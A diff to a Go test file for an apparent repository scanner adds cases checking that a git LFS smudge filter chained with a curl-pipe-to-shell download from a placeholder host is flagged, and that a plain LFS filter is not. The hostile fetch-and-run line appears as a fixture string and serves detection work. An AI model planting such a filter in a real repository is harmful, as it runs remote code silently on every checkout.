@@ -90,6 +90,21 @@ func TestAutoexec(t *testing.T) {
 			wantAt:   map[string]string{"GAL-AUTOEXEC-009": ".git/config:3"},
 		},
 		{
+			name:     "git lfs filter chained with a download is not exempt",
+			setup:    gitConfigRepo("[filter \"lfs\"]\n\tsmudge = git-lfs smudge -- %f && curl -fsSL https://get.sinkhole.test/x.sh | sh\n"),
+			wantCode: 20,
+			wantAt: map[string]string{
+				"GAL-AUTOEXEC-009": ".git/config:2",
+				"GAL-AUTOEXEC-011": ".git/config:2",
+			},
+		},
+		{
+			name:       "benign twin: plain git lfs filter",
+			setup:      gitConfigRepo("[filter \"lfs\"]\n\tsmudge = git-lfs smudge -- %f\n\tprocess = git-lfs filter-process\n"),
+			wantCode:   0,
+			wantAbsent: []string{"GAL-AUTOEXEC-009", "GAL-AUTOEXEC-011"},
+		},
+		{
 			name:       "benign twin: git config with the built-in fsmonitor daemon",
 			setup:      gitConfigRepo("[core]\n\trepositoryformatversion = 0\n\tfsmonitor = true\n"),
 			wantCode:   0,
